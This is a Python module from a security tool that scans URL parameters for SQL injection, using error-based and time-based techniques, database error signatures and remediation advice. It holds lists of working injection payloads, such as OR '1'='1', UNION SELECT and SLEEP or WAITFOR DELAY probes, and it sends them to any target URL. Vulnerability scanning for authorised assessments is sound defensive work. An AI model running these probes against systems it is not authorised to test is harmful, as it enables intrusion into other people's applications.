# janus/attack/sqli_detector.py
"""
SQL Injection Detection Module.

Basic SQL injection detection through error-based and time-based techniques.
NOT a full SQLi exploitation tool - just detection for security assessments.
"""

import requests
import time
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Any, Optional
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


@dataclass
class SQLiFinding:
    """A single SQL injection finding."""
    endpoint: str
    parameter: str
    payload: str
    technique: str  # error_based, time_based, boolean_based
    vulnerable: bool
    severity: str
    evidence: str
    recommendation: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class SQLiReport:
    """SQL injection scan report."""
    target_url: str
    scan_time: str
    vulnerable_params: int
    total_params_tested: int
    findings: List[SQLiFinding] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            'findings': [f.to_dict() for f in self.findings]
        }


class SQLiDetector:
    """
    SQL Injection Detector.
    
    Uses passive detection techniques to identify potential SQLi:
    - Error-based: Checks for database error messages
    - Time-based: Checks for response delays with sleep payloads
    - Boolean-based: Compares true/false condition responses
    
    DISCLAIMER: For authorized security testing only.
    """
    
    # SQL error patterns by database type
    ERROR_PATTERNS = {
        'mysql': [
            'you have an error in your sql syntax',
            'warning: mysql',
            'unclosed quotation mark',
            'mysql_fetch_array',
            'mysql_num_rows',
            'mysqli_',
        ],
        'postgresql': [
            'pg_query',
            'pg_exec',
            'postgresql error',
            'unterminated quoted string',
            'syntax error at or near',
        ],
        'mssql': [
            'microsoft sql server',
            'mssql_query',
            'odbc sql server driver',
            'unclosed quotation mark after the character string',
            'procedure or function',
        ],
        'oracle': [
            'ora-00',
            'ora-01',
            'oracle error',
            'pl/sql',
            'quoted string not properly terminated',
        ],
        'sqlite': [
            'sqlite_query',
            'sqlite3_',
            'sqlite error',
            'unrecognized token',
            'sql logic error',
        ],
        'generic': [
            'sql syntax',
            'sql error',
            'syntax error',
            'query failed',
            'database error',
            'odbc error',
            'invalid query',
        ],
    }
    
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "';",
        "\";",
        "1'",
        "1\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1'--",
        "1' OR '1'='1",
        "' AND '1'='2",
        "') OR ('1'='1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
    ]
    
    # Time-based payloads (sleep commands)
    TIME_PAYLOADS = [
        ("1' AND SLEEP(3)--", 3, 'mysql'),
        ("1\" AND SLEEP(3)--", 3, 'mysql'),
        ("1' WAITFOR DELAY '0:0:3'--", 3, 'mssql'),
        ("1'; SELECT pg_sleep(3);--", 3, 'postgresql'),
        ("1' AND (SELECT * FROM (SELECT SLEEP(3))a)--", 3, 'mysql'),
    ]
    
    # Boolean-based payloads (true vs false)
    BOOLEAN_PAYLOADS = [
        ("1' AND '1'='1", "1' AND '1'='2"),  # True, False
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR 1=1--", "' OR 1=2--"),
    ]
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
    
    def scan(
        self,
        url: str,
        params: Optional[List[str]] = None,
        token: Optional[str] = None,
        method: str = "GET"
    ) -> SQLiReport:
        """
        Scan URL parameters for SQL injection.
        
        Args:
            url: Target URL
            params: List of parameter names to test (auto-detected if None)
            token: Optional authorization token
            method: HTTP method
        
        Returns:
            SQLiReport with findings
        """
        findings = []
        headers = {'Authorization': token} if token else {}
        
        # Auto-detect parameters from URL
        if params is None:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            params = list(query_params.keys())
        
        for param in params:
            # Test error-based
            error_findings = self._test_error_based(url, param, headers, method)
            findings.extend(error_findings)
            
            # Test time-based (slower, so only if no error-based found)
            if not any(f.parameter == param and f.vulnerable for f in findings):
                time_findings = self._test_time_based(url, param, headers, method)
                findings.extend(time_findings)
        
        vulnerable_count = len([f for f in findings if f.vulnerable])
        
        return SQLiReport(
            target_url=url,
            scan_time=datetime.now().isoformat(),
            vulnerable_params=vulnerable_count,
            total_params_tested=len(params),
            findings=findings
        )
    
    def _test_error_based(
        self,
        url: str,
        param: str,
        headers: Dict,
        method: str
    ) -> List[SQLiFinding]:
        """Test for error-based SQL injection."""
        findings = []
        
        for payload in self.ERROR_PAYLOADS:
            test_url = self._inject_payload(url, param, payload)
            
            try:
                if method.upper() == "GET":
                    response = requests.get(test_url, headers=headers, timeout=self.timeout)
                else:
                    response = requests.post(url, data={param: payload}, headers=headers, timeout=self.timeout)
                
                # Check for SQL errors in response
                db_type, error_found = self._check_sql_errors(response.text)
                
                if error_found:
                    findings.append(SQLiFinding(
                        endpoint=url,
                        parameter=param,
                        payload=payload,
                        technique='error_based',
                        vulnerable=True,
                        severity='CRITICAL',
                        evidence=f"SQL error detected ({db_type}): {error_found[:100]}",
                        recommendation="Use parameterized queries/prepared statements. Never concatenate user input into SQL."
                    ))
                    break  # One finding per param is enough
                    
            except Exception:
                pass
        
        return findings
    
    def _test_time_based(
        self,
        url: str,
        param: str,
        headers: Dict,
        method: str
    ) -> List[SQLiFinding]:
        """Test for time-based blind SQL injection."""
        findings = []
        
        for payload, delay, db_type in self.TIME_PAYLOADS[:2]:  # Limit for speed
            test_url = self._inject_payload(url, param, payload)
            
            try:
                start = time.time()
                
                if method.upper() == "GET":
                    requests.get(test_url, headers=headers, timeout=self.timeout + delay + 2)
                else:
                    requests.post(url, data={param: payload}, headers=headers, timeout=self.timeout + delay + 2)
                
                elapsed = time.time() - start
                
                # If response took significantly longer, might be vulnerable
                if elapsed >= delay - 0.5:
                    findings.append(SQLiFinding(
                        endpoint=url,
                        parameter=param,
                        payload=payload,
                        technique='time_based',
                        vulnerable=True,
                        severity='CRITICAL',
                        evidence=f"Response delayed by {elapsed:.1f}s (expected {delay}s delay). Possible {db_type} time-based SQLi.",
                        recommendation="Use parameterized queries. Time-based SQLi indicates the query is being executed."
                    ))
                    break
                    
            except requests.exceptions.Timeout:
                # Timeout might indicate successful sleep
                findings.append(SQLiFinding(
                    endpoint=url,
                    parameter=param,
                    payload=payload,
                    technique='time_based',
                    vulnerable=True,
                    severity='CRITICAL',
                    evidence=f"Request timed out - possible {db_type} time-based blind SQLi",
                    recommendation="Use parameterized queries/prepared statements."
                ))
                break
            except Exception:
                pass
        
        return findings
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        query_dict[param] = [payload]
        
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def _check_sql_errors(self, response_text: str) -> tuple:
        """Check response for SQL error patterns."""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern in response_lower:
                    # Find the error context
                    idx = response_lower.find(pattern)
                    context = response_text[max(0, idx-20):idx+len(pattern)+80]
                    return db_type, context
        
        return None, None
    
    def quick_scan(
        self,
        url: str,
        param: str,
        token: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Quick scan of a single parameter.
        
        Returns:
            Dict with basic results
        """
        report = self.scan(url, [param], token)
        
        return {
            "url": url,
            "parameter": param,
            "vulnerable": report.vulnerable_params > 0,
            "findings": [f.to_dict() for f in report.findings]
        }
